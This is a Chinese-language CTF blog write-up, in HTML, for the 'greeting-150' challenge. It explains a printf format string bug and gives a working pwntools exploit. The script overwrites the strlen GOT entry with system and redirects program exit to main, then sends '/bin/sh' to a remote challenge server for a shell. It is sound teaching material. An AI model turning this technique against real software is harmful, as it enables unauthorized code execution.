@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="首先看一下保护机制   然后我们拖入IDA，发现是一个很简单的程序。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="greeting-150">
+<meta property="og:url" content="https://github.com/ha1vk/2019/11/09/greeting-150/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="首先看一下保护机制   然后我们拖入IDA，发现是一个很简单的程序。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/09/greeting-150/image1.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/09/greeting-150/image2.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/09/greeting-150/image3.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/09/greeting-150/image4.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/09/greeting-150/image5.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/09/greeting-150/image6.JPG">
+<meta property="article:published_time" content="2019-11-09T03:46:00.000Z">
+<meta property="article:modified_time" content="2025-06-21T06:52:20.714Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="格式化字符串漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2019/11/09/greeting-150/image1.JPG">
+
+<link rel="canonical" href="https://github.com/ha1vk/2019/11/09/greeting-150/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>greeting-150 | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2019/11/09/greeting-150/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          greeting-150
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-09 11:46:00" itemprop="dateCreated datePublished" datetime="2019-11-09T11:46:00+08:00">2019-11-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-21 14:52:20" itemprop="dateModified" datetime="2025-06-21T14:52:20+08:00">2025-06-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>首先看一下保护机制</p>
+<img src="/ha1vk/2019/11/09/greeting-150/image1.JPG" class="">
+
+<p>然后我们拖入IDA，发现是一个很简单的程序。</p>
+<img src="/ha1vk/2019/11/09/greeting-150/image2.JPG" class="">
+
+<img src="/ha1vk/2019/11/09/greeting-150/image3.JPG" class="">
+
+<p>然而，最后的那个**printf(&amp;s);**存在格式化字符串漏洞，可以造成任意地址的读写。</p>
+<p>首先，我们需要确定我们输入的数据的相对位置。</p>
+<img src="/ha1vk/2019/11/09/greeting-150/image4.JPG" class="">
+
+<p>经过测试，我们需要在前面填充2个字符，然后接下来我们的数据会位于第12个位置</p>
+<p>那么，我们的payload &#x3D; ‘aa’ + p32(address) + ‘%10c%12$n’</p>
+<p>，我们就能把address处的数据写为(10+4+2+strlen(“Nice to meet you,”))这个值</p>
+<p>原理请见<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ichunqiu/p/9329387.html">https://www.cnblogs.com/ichunqiu/p/9329387.html</a></p>
+<p>那么，我们可以用这种方式来修改GOT表</p>
+<p>我们可以修改strlen的GOT表内容为system的PLT，然后我们想办法让程序程序回到main，执行strlen，我们输入&#x2F;bin&#x2F;sh，即可get shell</p>
+<p><strong>我们发现，程序结束时，会调用这个地方，我们利用printf把这里也一起修改为main的地址</strong></p>
+<img src="/ha1vk/2019/11/09/greeting-150/image5.JPG" class="">
+
+<p>以上两个地方的修改必须在一次完成，并且，<strong>我们的payload长度不能大于64</strong>，因为程序最多读取64个字符，因此，我们精心布置payload。并且，我们应该拆分4字节，分开写，不要，printf()需要输出很多字符，假如我们要让目标地址存入main_addr，如果我们是</p>
+<p>payload &#x3D; ‘aa’ + p32(fini_got) + “%” + str(main_addr -4 -2 – strlen(“Nice to meet you,”)) + ‘c%12$n’，那么printf需要输出main_addr这么多个字符，也就是</p>
+<p>0x80485ED &#x2F; 1024 &#x2F; 1024 &#x3D; 128MB，这是非常低效的。因此，我们有另一种方法。在printf的格式化修饰符中，<strong>hn 为WORD(字),hhn为BYTE(字节),n为DWORD(双字)</strong></p>
+<ol>
+<li><p>fini_got &#x3D; 0x8049934  </p>
+</li>
+<li><p>main_addr &#x3D; 0x80485ED  </p>
+</li>
+<li><p>strlen_got &#x3D; 0x8049A54  </p>
+</li>
+<li><p>system_plt &#x3D; 0x8048490</p>
+</li>
+</ol>
+<p>  </p>
+<p>此处的数据，只有后2字节与main_addr不一样，因此，我们只需要修改后两字节</p>
+<img src="/ha1vk/2019/11/09/greeting-150/image6.JPG" class="">
+
+<p>然后就是strlen的GOT表内容，四个字节我们都需要修改，我们拆分为2个2字节写。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arr = [  </span><br><span class="line"><span class="number">0x85ED</span>,</span><br><span class="line"><span class="number">0x8490</span>,<span class="number">0x804</span>  </span><br><span class="line">]  </span><br></pre></td></tr></table></figure>
+
+<p>由于因特尔处理器小端存储，因此，我们要在fini_got写入2字节数据arr[0]</p>
+<p>在strlen_got写入2字节数据arr[2]，在strlen_got+2处写入2字节数据arr[1]</p>
+<p>我们应该按照数据的大小，<strong>从小到大的顺序写。</strong></p>
+<p>那么，<strong>我们需要先写0x804这个数据，再写0x8490,再写0x85ED(想想为什么?)，这样，printf总共输出了0x85ED个字符，也就是33KB大小的数据，效率提升了近4000倍</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#sh = process(&#x27;./pwnh16&#x27;)  </span></span><br><span class="line">sh = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">47556</span>)  </span><br><span class="line">  </span><br><span class="line">fini_got = <span class="number">0x8049934</span>  </span><br><span class="line">main_addr = <span class="number">0x80485ED</span>  </span><br><span class="line">strlen_got = <span class="number">0x8049A54</span>  </span><br><span class="line">system_plt = <span class="number">0x8048490</span>  </span><br><span class="line">  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please tell me your name... &#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#通过观察,这几个地址只有后2字节不一样  </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">2</span>  </span><br><span class="line">payload += p32(strlen_got)  </span><br><span class="line">payload +=  p32(strlen_got+<span class="number">2</span>)  </span><br><span class="line">payload += p32(fini_got)  </span><br><span class="line">  </span><br><span class="line">arr = [  </span><br><span class="line">   <span class="number">0x85ED</span>,  </span><br><span class="line">   <span class="number">0x8490</span>,<span class="number">0x804</span>  </span><br><span class="line">]  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#注意，我们的payload长度不能超过64，不然后面的都读取不到，因为最多输入64个字符  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#hn 为WORD(字),hhn为BYTE(字节),n为DWORD(双字)  </span></span><br><span class="line"><span class="comment">#修改strlen GOT内容的前2字节  </span></span><br><span class="line">num = arr[<span class="number">2</span>] - <span class="number">32</span>  </span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%13$hn&#x27;</span>  </span><br><span class="line"><span class="comment">#修改strlen GOT内容的后2字节  </span></span><br><span class="line">num = arr[<span class="number">1</span>] - arr[<span class="number">2</span>]  </span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%12$hn&#x27;</span>  </span><br><span class="line"><span class="comment">#修改fini的后2字节  </span></span><br><span class="line">num = arr[<span class="number">0</span>] - arr[<span class="number">1</span>]  </span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%14$hn&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(payload)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#get shell  </span></span><br><span class="line">  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please tell me your name... &#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" rel="tag"># 格式化字符串漏洞</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2019/11/09/100levels/" rel="prev" title="100levels">
+      <i class="fa fa-chevron-left"></i> 100levels
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2019/11/09/hacknote/" rel="next" title="hacknote">
+      hacknote <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
